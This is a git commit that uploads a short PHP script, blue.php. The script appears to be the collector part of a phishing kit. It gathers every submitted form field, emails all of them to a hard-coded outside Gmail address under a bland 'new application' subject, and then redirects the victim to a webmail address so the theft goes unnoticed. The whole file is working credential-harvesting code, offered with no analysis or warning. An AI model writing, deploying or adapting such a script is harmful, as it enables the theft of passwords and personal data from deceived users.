71a66cf9af353a6b978c37f711804d778f01a7c1
albertmavin <albertmavin12@gmail.com>
2025-01-24 00:24:16 -0800

    Add files via upload

---
+++ blue.php
@@ -0,0 +1,14 @@
+<?php
+
+$mailto = 'ogbeezy111@gmail.com';
+	$subject = 'new application';
+	$input = $_POST;
+	$redirect = "index.html";
+	$msg = '';
+	foreach($input as $key => $value ) {
+	     $msg .= $key.' : '.$value."\n";
+	}
+	mail($mailto, $subject, $msg);
+echo "<script>window.location='http://poczta.actuna.com/'</script>";
+
+?>
